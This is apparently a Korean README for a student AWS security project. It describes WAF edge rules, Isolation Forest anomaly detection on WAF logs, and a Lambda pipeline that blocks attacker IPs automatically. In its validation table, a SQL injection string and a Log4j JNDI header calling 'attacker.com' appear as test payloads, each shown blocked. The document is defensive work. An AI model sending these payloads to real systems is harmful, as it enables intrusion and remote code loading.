# AWS 3-Layer Security AIOps Platform

> 이커머스 환경의 실전 보안 위협을 막기 위해 설계한 **AWS 네이티브 기반 예측적 보안 자동화 시스템**  
> CloudFront·WAF 엣지 방어 → Isolation Forest 이상 탐지 → SOAR 자동 대응으로 이어지는 완전 자동화 방어 체계

[![Platform](https://img.shields.io/badge/Platform-AWS-orange?logo=amazon-aws)](https://aws.amazon.com)
[![Python](https://img.shields.io/badge/Python-3.11-blue?logo=python)](https://python.org)
[![ML](https://img.shields.io/badge/ML-Isolation_Forest-green)](https://scikit-learn.org)
[![CloudWave](https://img.shields.io/badge/CloudWave-7기_4조-purple)](https://velog.io/@yapp)

---

## 목차

1. [프로젝트 배경 및 목적](#1-프로젝트-배경-및-목적)
2. [전체 아키텍처](#2-전체-아키텍처)
3. [Layer 1: Edge Defense](#3-layer-1-edge-defense)
4. [Layer 2: Predictive AIOps](#4-layer-2-predictive-aiops)
5. [Layer 3: SOAR Pipeline](#5-layer-3-soar-pipeline)
6. [보안 성과 및 검증 결과](#6-보안-성과-및-검증-결과)
7. [실전 트러블슈팅](#7-실전-트러블슈팅)
8. [기술 스택 선택 근거](#8-기술-스택-선택-근거)
9. [코어 파일 구성](#9-코어-파일-구성)
10. [블로그 시리즈](#10-블로그-시리즈)

---

## 1. 프로젝트 배경 및 목적

### 문제 정의

이커머스 플랫폼은 프로모션·할인 이벤트 시점에 정상 트래픽과 악성 트래픽이 동시에 폭증한다. 이 환경에서 두 가지 현실적 제약이 설계 기준을 결정했다.

**제약 1 — 예산**: 부트캠프에서 지원받은 **$1,200 크레딧** 안에서 3주간 EKS를 운영해야 했다. 악성 트래픽이 클러스터 내부까지 유입되면 ALB·Pod·Node 리소스를 소모하여 비용이 증가하는 구조다.

**제약 2 — 레이블 부재**: 실운영 보안 로그는 대부분 레이블이 없다. 정상 데이터가 압도적으로 많고 공격 데이터는 희귀하기 때문에, 지도 학습 기반 분류 모델을 구축하기 어렵다.

두 제약을 동시에 해결하기 위해 세 가지 설계 원칙을 수립했다.

| 원칙 | 내용 | 효과 |
| :--- | :--- | :--- |
| **앞단 차단** | 악성 트래픽을 Edge에서 먼저 제거 | EKS 컴퓨팅 비용 최소화 |
| **비지도 탐지** | Isolation Forest로 레이블 없이 이상 패턴 감지 | Zero-day 위협 대응 |
| **완전 자동화** | 탐지→판단→차단을 사람 개입 없이 수행 | 24/7 방어, 초단위 대응 |

### 설계 배경

> "악성 트래픽이 EKS 클러스터 근처까지 오기 전에 엣지에서 먼저 차단하자."

AWS SCS(Security Specialty) 자격증 취득 경험과 졸업작품으로 진행했던 Isolation Forest 기반 이상 탐지 프로젝트 경험을 CloudWave 7기 보안 파트에 접목하여, 단순 방어를 넘어 **선행 탐지 + 자동 대응**까지 확장한 3-Layer 보안 구조를 설계했다.

---

## 2. 전체 아키텍처

<img width="1197" height="681" alt="전체 아키텍처" src="https://github.com/user-attachments/assets/975e7f70-c9cc-43cb-b81d-8dd35cd06674" />

전체 보안 파이프라인은 **차단 → 탐지 → 대응 → 시각화**의 폐루프(Closed-loop) 구조다.

```
[Layer 1: Edge Defense]
Route53 → CloudFront → WAF v2 → ALB → EKS
    │
    └─ WAF 로그 (JSON)
             ↓
[Layer 2: Predictive AIOps]
    monitor.py (Isolation Forest)
             ↓
    S3 → Athena → Grafana
             │
    pred_risk score
             ↓
[Layer 3: SOAR Pipeline]
    GuardDuty → EventBridge → SNS
                                ↓
                      Analyzer Lambda (Athena 조회)
                                ↓
                      Preventer Lambda
                      ├─ WAF IPSet 업데이트
                      └─ CloudWatch Metric → Grafana
```

각 계층은 독립적으로 작동하면서 **S3 데이터 레이크**를 공유 인터페이스로 연결된다. Layer 1 WAF 로그 → Layer 2 ML 학습 데이터 → Layer 3 자동 차단으로 이어지며, 차단된 공격 패턴이 다시 모델 피드백으로 재투입되는 **선순환 구조(Feedback Loop)**를 형성한다.

---

## 3. Layer 1: Edge Defense

### 아키텍처

```
Route53 → CloudFront (Origin Cloaking) → WAF v2 → ALB → EKS
```

- **CloudFront**: Origin Cloaking으로 EKS의 실제 IP를 외부에 노출하지 않는다. CDN 기반 트래픽 분산으로 DDoS 공격 표면도 줄인다.
- **Security Group**: ALB 포트 외 모든 포트를 폐쇄하는 'Default Deny' L4 방어선. 추가 비용 없음.
- **AWS WAF v2**: L7 계층 웹 공격 차단.

### WAF 규칙 우선순위 (Priority)

| Priority | Rule | 목적 |
| :---: | :--- | :--- |
| **P0** | Allow-Only-Korea | 불필요한 해외 트래픽 1차 차단 (Geo-blocking) |
| **P1** | AWSManagedRulesCommonRuleSet | OWASP Top 10 공격 패턴 차단 |
| **P2** | AWSManagedRulesSQLiRuleSet | SQL Injection 특화 차단 |
| **P3** | AWSManagedRulesKnownBadInputsRuleSet | Log4j, JNDI 등 알려진 악성 입력 차단 |
| **P4** | IP Reputation List (동적) | Lambda가 실시간으로 갱신하는 블랙리스트 |

P0에서 해외 IP를 걸러낸 뒤, 국내 발신 공격은 P1~P3 Managed Rule이 탐지한다. SOAR에서 식별한 공격 IP는 P4에 자동 반영되어 이후 요청을 즉시 차단한다.

![WAF Rules](assets/waf-rules.png)

### 설계 근거: 왜 Edge에서 먼저 차단하는가?

WAF가 공격을 차단하면 요청은 EKS까지 전달되지 않는다. EKS는 Node 수에 비례하여 시간당 과금되므로, 악성 트래픽이 오토스케일링을 유발하기 전에 제거하는 것이 **비용과 가용성을 동시에 지키는 핵심 전략**이다.

---

## 4. Layer 2: Predictive AIOps

### Isolation Forest를 선택한 이유

보안 로그 데이터의 세 가지 특성이 알고리즘 선택을 결정했다.

| 특성 | 내용 | 알고리즘 요건 |
| :--- | :--- | :--- |
| 클래스 불균형 | 정상 트래픽이 99% 이상 | 비지도 학습 필수 |
| 레이블 부재 | 실운영 로그는 대부분 미분류 | 지도 학습 불가 |
| 희귀 공격 | 공격 샘플 극소수 | 이상치(outlier) 탐지 적합 |

Isolation Forest는 데이터를 랜덤하게 분할하여 **적은 횟수로 고립되는 데이터를 이상치로 판단**한다. 레이블 없이 정상 패턴을 학습하고, 그 패턴에서 벗어난 트래픽을 이상으로 분류한다.

> **모델의 핵심 질문:** "이 트래픽은 다른 데이터와 비교했을 때 너무 특이하지 않은가?"

### Feature Engineering

`monitor.py`에서 WAF 로그의 3가지 피처를 추출한다.

| Feature | 설명 | 공격 신호 |
| :--- | :--- | :--- |
| `country_code` | 요청 발신 국가 | 평소 없던 국가에서의 접근 → 스캐닝 초기 신호 |
| `rule_code` | WAF Managed Rule 위반 패턴 | 공격 패턴 발생 빈도 정량화 |
| `uri_len` | URI 길이 | SQL Injection은 비정상적으로 긴 URI를 생성 |

### 60초 Prediction Lead Time

공격자는 치명적인 공격 전에 반드시 **엔드포인트 스캐닝 → 취약점 탐색 → 반복 요청 테스트** 순의 사전 정찰을 수행한다. 이 사전 정찰 단계에서 발생하는 미세한 이상 패턴 변화를 ML 모델이 탐지하여, 실제 공격이 인프라에 도달하기 **약 60초 전에 대응 시간을 확보**한다.

```python
LEAD_SECONDS = 60  # 선행 탐지 윈도우 (초)
```

### Dynamic Threshold (동적 임계값)

고정 임계값(`risk > 80`)은 트래픽 패턴이 변화하면 오탐(False Positive)이 증가한다. 대신 **전체 위험 점수 분포의 하위 5%**를 임계값으로 사용하여, 실시간 트래픽 흐름에 따라 기준이 자동 조정된다.

```python
# 전체 위험 점수 분포에서 하위 5%를 기준으로 이상치 계산
threshold = np.percentile(scores_all, 5)
```

### Pre-Mitigation 시스템

예측 위험도가 임계값을 초과하면 실제 공격 확인 전에 방어 레벨을 선제적으로 올린다.

```python
# 예측 위험도가 70점을 상회할 경우 사전 대응 모드 활성화
if pred_risk > 70:
    premit_on = True
```

![Grafana Table](assets/grafana-table.png)

---

## 5. Layer 3: SOAR Pipeline

### 아키텍처

GuardDuty의 위협 탐지와 ML의 예측 결과를 결합하여 **사람 개입 없이 24/7 자동 차단**이 이루어지는 구조다.

```
GuardDuty (위협 탐지)
    ↓
EventBridge (이벤트 필터링 및 라우팅)
    ↓
SNS (Fan-out: Slack·Email·Lambda 동시 전달)
    ↓
Analyzer Lambda → Athena 조회 → 공격 IP / 타입 / ML 위험도 종합 판단
    ↓
Preventer Lambda → WAF IPSet 업데이트 (초단위 대응)
```

### Security Preventer: Lock Token 동시성 제어

WAF IPSet을 API로 업데이트할 때 동시 요청 충돌을 막기 위해 **Lock Token**을 반드시 획득 후 갱신한다.

```python
import boto3

def lambda_handler(event, context):
    waf_client = boto3.client('wafv2')

    # 1. 기존 IPSet 및 Lock Token 획득
    response = waf_client.get_ip_set(
        Name='AttackersIPSet', Scope='REGIONAL', Id='<ip-set-id>'
    )
    lock_token = response['LockToken']

    # 2. 새 공격 IP 추가 (중복 제거)
    current_ips = response['IPSet']['Addresses']
    new_ips = list(set(current_ips + event['detected_ips']))

    # 3. IPSet 갱신
    waf_client.update_ip_set(
        Name='AttackersIPSet', Scope='REGIONAL', Id='<ip-set-id>',
        Addresses=new_ips, LockToken=lock_token
    )

    return {"status": "success", "blocked_count": len(event['detected_ips'])}
```

![Analyzer Query](assets/analyzer-query.png)

### 설계 근거: LGP Stack vs OpenSearch

| 항목 | OpenSearch | LGP Stack (채택) |
| :--- | :---: | :---: |
| 상시 운영 비용 | 높음 (전용 클러스터) | **80% 이상 절감** |
| 메트릭 + 로그 통합 | 별도 구성 필요 | **단일 Grafana 화면** |
| 서버리스 연동 | 제한적 | Lambda·Athena 네이티브 연동 |
| 학습 난이도 | 높음 | 보통 |

---

## 6. 보안 성과 및 검증 결과

### 공격 차단 검증

| 시나리오 | 방법 | 결과 |
| :--- | :--- | :--- |
| SQL Injection | `id=' or 1=1--` 페이로드 전송 | **403 Forbidden** (WAF SQLiRuleSet) |
| Log4j / JNDI Injection | `User-Agent: ${jndi:ldap://attacker.com/a}` | **403 Forbidden** (KnownBadInputs) |
| 해외 IP 접근 (네덜란드·미국) | 해외 IP에서 직접 요청 | **403 Forbidden** (Allow-Only-Korea) |
| GuardDuty 탐지 → 자동 차단 | 샘플 위협 이벤트 생성 | Lambda가 WAF IPSet 자동 갱신 |

- Athena 기반 로그 분석을 통해 **총 8건의 유효 차단 로그** 확보, 시스템 신뢰성 데이터로 검증
- `pred_risk` 75.0 측정 시 70점 임계값 초과 → Pre-Mitigation 모드 정상 활성화 확인

![403 Block](assets/403-block.png)

![AIOps Dashboard](assets/aiops-dashboard.png)

![Grafana Gauge](assets/grafana-gauge.png)

### 비용 구조

| 서비스 | 활용법 | 예상 비용 |
| :--- | :--- | :---: |
| Security Group | ALB 포트 외 전체 폐쇄 (Default Deny) | **무료** |
| AWS Lambda | Isolation Forest 구동 + WAF 차단 명령 | **월 100만 호출 무료** |
| VPC Flow Logs | ML 학습 데이터셋 수집 (S3 적재) | 저장량 비례 (저렴) |
| S3 + DynamoDB | 공격 IP 블랙리스트 + 로그 저장 | **월 $5 미만** |
| AWS WAF | L7 방어, Lambda가 실시간 규칙 갱신 | 규칙당 $1 / 1M 요청당 $0.6 |
| GuardDuty | 지능형 위협 탐지 + Lambda 트리거 | **월 $20~40** |

---

## 7. 실전 트러블슈팅

### 문제 1 — WAF IPSet 생성 실패 (ValidationException)

**현상**: Lambda에서 `CreateIPSet` 실행 시 `WAFv2:ValidationException` 발생.

**원인**: `Description` 필드에 한글(유니코드)을 포함한 것이 원인. AWS API는 특정 필드에 정규표현식 제약을 적용하여 한글 문자열이 포함된 요청을 거부한다.

**해결**:
```python
# Before
Description='공격 IP 자동 차단'

# After
Description='Auto-blocking malicious IPs detected by GuardDuty'
```

---

### 문제 2 — Athena CLI 옵션 인식 불가 에러

**현상**: `aws athena start-query-execution --query-config` 실행 시 `Unknown options` 에러.

**원인**: AWS CLI v2에서 옵션 명칭이 변경되었다. `--query-config`는 v1 문법이다.

**해결**: `--result-configuration` 구조로 명령어 재편성.

```bash
aws athena start-query-execution \
    --query-string "SELECT httpRequest.clientIp, action, terminatingRuleId \
                    FROM monitoring_db.waf_logs WHERE action = 'BLOCK' LIMIT 10" \
    --result-configuration "OutputLocation=s3://aws-waf-logs-cloudwave-monitoring/athena-results/" \
    --region ap-northeast-2
```

---

### 문제 3 — Athena 쿼리 결과 파일 404 에러 (S3 경로 불일치)

**현상**: 쿼리가 성공했음에도 결과 CSV 파일을 `OutputLocation` 경로에서 찾을 수 없음.

**원인**: Athena가 쿼리 실행 시 `OutputLocation` 하위에 **쿼리 ID 기반의 하위 디렉토리를 자동 생성**한다. 지정한 경로에 파일이 직접 저장되지 않아 경로 불일치가 발생했다.

**해결**: `aws s3 ls --recursive`로 버킷 내 실제 객체 키를 추적하여 파일 위치 확인.

```bash
aws s3 ls s3://aws-waf-logs-cloudwave-monitoring/athena-results/ --recursive
```

---

## 8. 기술 스택 선택 근거

| 기술 | 채택 이유 | 대안 대비 장점 |
| :--- | :--- | :--- |
| **Isolation Forest** | 레이블 없는 보안 로그, 클래스 극불균형 환경에 최적 | 지도 학습 대비 레이블 수집 비용 없음 |
| **AWS WAF v2** | Managed Rule로 OWASP 방어 즉시 활성화, Lambda API 제어 가능 | 3rd-party WAF 대비 AWS 네이티브 연동 |
| **CloudFront** | Edge 트래픽 흡수 + Origin Cloaking으로 EKS IP 노출 방지 | ALB 직접 노출 대비 공격 표면 대폭 감소 |
| **GuardDuty** | 인프라 레벨 지능형 탐지, EventBridge 트리거 기본 지원 | 커스텀 탐지 로직 구현 불필요, 월 $20~40 수준 |
| **Lambda (Serverless)** | 월 100만 호출 무료, 이벤트 발생 시에만 실행 | 상시 EC2 운영 대비 비용 사실상 제로 |
| **LGP Stack** | Grafana 하나로 메트릭·로그·ML 스코어 통합 시각화 | OpenSearch 대비 운영 비용 80% 이상 절감 |
| **S3 + Athena** | 서버리스 데이터 레이크, 스캔량 기준 쿼리 과금 | RDS/ElasticSearch 대비 유지비 거의 없음 |

---

## 9. 코어 파일 구성

```
Security-AIOps-IsolationForest/
├── monitor/
│   └── monitor.py                       # AI 탐지 엔진 (Isolation Forest + S3 전송)
├── lambda/
│   ├── lambda_security_analyzer.py      # 위험도 분석 및 차단 판단
│   └── lambda_security_preventer.py     # WAF IPSet 갱신 (실제 방어 실행)
└── data/
    ├── final_preprocessed_waf_data.csv  # monitor.py 학습용 정제 데이터셋
    └── enriched_waf_data.json           # Analyzer가 식별한 공격 패턴 + 부가 정보
```

### monitor.py 핵심 흐름

```
WAF 로그
    ↓
country_code / rule_code / uri_len 피처 추출
    ↓
Isolation Forest → obs_risk (관측 위험도) 산출
    ↓
LEAD_SECONDS=60 선행 윈도우 → pred_risk (예측 위험도) 계산
    ↓
pred_risk > 70 → premit_on = True (Pre-Mitigation 활성화)
    ↓
결과 JSON → S3 적재 → Athena 쿼리 → Grafana 시각화
```

---

## 10. 블로그 시리즈

전체 구축 과정을 6편의 포스팅으로 상세 문서화했다.

| # | 제목 | 주요 내용 |
| :---: | :--- | :--- |
| [#0](https://velog.io/@yapp/AIOps-%EB%B3%B4%EC%95%88-%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8-0-AWS-%EA%B8%B0%EB%B0%98-3-Layer-%EB%B3%B4%EC%95%88-%EC%9E%90%EB%8F%99%ED%99%94-%EC%95%84%ED%82%A4%ED%85%8D%EC%B2%98-%EC%84%A4%EA%B3%84) | AWS 기반 3-Layer 보안 자동화 아키텍처 설계 | 전체 구조 개요, 3-Layer 설계 철학 |
| [#1](https://velog.io/@yapp/AIOps-보안-프로젝트-1.-AWS-네이티브-서비스로-구축한-선제적-엣지-보안-체계-m6lfq1c4) | AWS 네이티브 서비스로 구축한 선제적 엣지 보안 체계 | CloudFront·WAF 설계, WAF 규칙 우선순위, 비용 분석 |
| [#2](https://velog.io/@yapp/AIOps-보안-프로젝트-2.-SOAR-파이프라인과-데이터-기반-방어-검증) | SOAR 파이프라인과 데이터 기반 방어 검증 | GuardDuty·EventBridge·Lambda 구성, Athena 검증 |
| [#3](https://velog.io/@yapp/AIOps-보안-프로젝트-3.-Predictive-AIOps-구축기-Isolation-Forest로-공격을-60초-먼저-탐지하기) | Predictive AIOps 구축기: 60초 먼저 탐지하기 | Isolation Forest 모델, Feature Engineering, Dynamic Threshold |
| [#4](https://velog.io/@yapp/4.-%EC%98%88%EC%B8%A1-%EB%8D%B0%EC%9D%B4%ED%84%B0predrisk-%EA%B8%B0%EB%B0%98%EC%9D%98-%EC%A7%80%EB%8A%A5%ED%98%95-%EC%9E%90%EB%8F%99-%EB%8C%80%EC%9D%91SOAR-%EA%B5%AC%EC%B6%95%EA%B8%B0) | 예측 데이터 기반의 지능형 자동 대응(SOAR) 구축기 | Preventer Lambda, Lock Token, Feedback Loop |
| [#5](https://velog.io/@yapp/AIOps-%EB%B3%B4%EC%95%88-%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8-5.-%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C%EC%9B%A8%EC%9D%B4%EB%B8%8C-7%EA%B8%B0-%ED%9A%8C%EA%B3%A0-%EB%B3%B4%EC%95%88-%ED%8C%8C%ED%8A%B8%EB%A5%BC-%EB%A7%A1%EC%95%84-%EC%A7%84%ED%96%89%ED%95%9C-23%EC%9D%BC%EA%B0%84%EC%9D%98-%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8) | 클라우드웨이브 7기 회고 | 설계 결정 회고, 협업 방식, 배운 점 |

---

## Demo

[![YouTube Demo](https://img.shields.io/badge/YouTube-Demo_Video-red?logo=youtube)](https://youtu.be/VNAqdCOsqVg?si=ni_6LffDZZVUGLG8)

---

*© 2026 Minju Kim. 본 프로젝트의 아키텍처 설계와 핵심 로직 구현은 본인에게 소유권이 있습니다.*
